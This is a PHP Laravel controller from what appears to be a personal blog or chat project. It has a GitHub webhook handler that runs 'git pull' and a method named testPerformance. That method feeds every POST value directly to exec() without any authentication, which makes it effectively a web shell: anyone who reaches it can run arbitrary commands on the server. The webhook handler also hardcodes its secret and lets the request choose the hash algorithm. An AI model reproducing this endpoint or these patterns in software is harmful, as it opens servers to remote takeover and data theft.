<?php

namespace App\Http\Controllers\Caiji;

use Illuminate\Http\Request;
use App\Http\Controllers\Controller;

class ApiCommandController extends Controller
{
    protected $request;
    public function __construct(Request $request)
    {
        $this->request = $request;
    }

    public function pullGithub()
    {
        $github_signa = $_SERVER['HTTP_X_HUB_SIGNATURE'];//继续测试通道01
        list($hash_type, $hash_value) = explode('=', $github_signa, 2);
        $payload = file_get_contents("php://input");
        $secret = 'xiaoma1212';
        $hash = hash_hmac($hash_type,$payload,$secret);
        if($hash && $hash === $hash_value)
        {
            echo '认证成功，开始更新';
           # echo exec("cd /data/project/blog");

            echo exec('/usr/bin/git pull');

            echo exec('cd /www/project/chat && /usr/bin/git pull');

            echo date("Y-m-d H:i:s");

            $arr =  ['status'=>'success'];
        }else{
            $arr =  ['status'=>'fail'];
        }
            return $arr;
    }

    public function testPerformance()
    {
        $post = $this->request->post();

        $arr = ['test'=>'fail'];

        if (!is_array($post) && empty($post))
        {
            $arr = ['status'=> 'fail', 'msg' => 'execute command is error!'];
        }else{
            $arr['test'] = 'success';
            foreach ($post as $v)
            {
                $arr[] = exec($v);
            }
        }
        return response()->json($arr);
    }
}
